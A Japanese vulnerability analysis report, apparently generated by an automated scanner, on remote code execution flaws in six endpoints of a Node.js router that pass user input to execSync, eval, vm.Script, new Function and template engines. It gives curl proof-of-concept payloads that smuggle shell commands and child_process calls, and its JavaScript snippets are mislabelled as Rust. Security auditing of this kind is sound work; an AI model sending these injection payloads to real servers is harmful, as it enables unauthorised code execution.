# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `RCE`

## 解析結果

本ルーターには複数のエンドポイントでユーザー入力をそのまま危険な関数／機能に渡しており、リモートコード実行（RCE）を許す重大な脆弱性が存在します。具体的には：

1. /system-exec: execSyncに未検証のコマンド文字列を渡しており、任意のシステムコマンドが実行可能。
2. /calculate: evalによる計算式評価で任意コード実行。
3. /execute-script: vm.Scriptでユーザー提供スクリプトをそのまま実行。
4. /create-function: new Functionにユーザー実装を直接渡して実行。
5. /render/email: EJS.renderにユーザーテンプレートを渡し、テンプレート内で任意JSが動作可能。
6. /render/handlebars: Handlebars.compileに未検証のテンプレートを渡しており、拡張子やカスタムヘルパーを利用したテンプレートインジェクションが可能（理論上のRCEリスク）。

これらを悪用すると、サーバ上で任意のOSコマンド実行、プロセス停止、ファイル操作などが行われ、機密情報漏洩やサービス停止につながります。

## PoC（概念実証コード）

```text
1) system-exec RCE例
curl -X POST http://host/system-exec -d '{"operation":"ls; whoami > /tmp/pwned"}'

2) calculate RCE例
curl -X POST http://host/calculate -d '{"formula":"require(\"child_process\").execSync(\"id > /tmp/id.txt\")"}'

3) execute-script RCE例
curl -X POST http://host/execute-script -d '{"script":"require(\"fs\").writeFileSync(\"/tmp/hacked\",\"ok\");"}'

4) create-function RCE例
curl -X POST http://host/create-function -d '{"implementation":"require(\"child_process\").execSync(\"touch /tmp/fn_pwned\");"}'

5) EmailテンプレートRCE例
curl -X POST http://host/render/email -d '{"template":"<%= require(\"child_process\").execSync(\"id > /tmp/email.txt\") %>"}'
```

## 関連コードコンテキスト

### 関数名: /system-exec
- 理由: ユーザー入力を検証せずにexecSyncへ渡している
- パス: repo/routes/integration.js
```rust
const output = execSync(fullCommand, { encoding: 'utf8', timeout: 5000 });
```

### 関数名: /calculate
- 理由: ユーザー提供のformulaを直接evalしている
- パス: repo/routes/integration.js
```rust
const result = eval(formula);
```

### 関数名: /execute-script
- 理由: ユーザー提供のscriptをvmで実行している
- パス: repo/routes/integration.js
```rust
const vmScript = new vm.Script(`
            try {
                result = (function() {
                    ${script}
                })();
            } catch (e) {
                result = { error: e.message };
            }
        `);
```

### 関数名: /create-function
- 理由: ユーザーの実装コードをnew Functionで実行している
- パス: repo/routes/integration.js
```rust
const dynamicFunction = new Function(...(parameters || []), implementation);
```

### 関数名: /render/email
- 理由: EJSテンプレートに任意コードを埋め込んで実行できる
- パス: repo/routes/integration.js
```rust
const rendered = ejs.render(template, variables || {});
```

### 関数名: /render/handlebars
- 理由: Handlebarsのテンプレートをユーザー入力でコンパイルしている
- パス: repo/routes/integration.js
```rust
const compiledTemplate = handlebars.compile(content);
```

## 解析ノート

各エンドポイントでユーザー入力をそのまま危険な関数に渡している点を調査しました

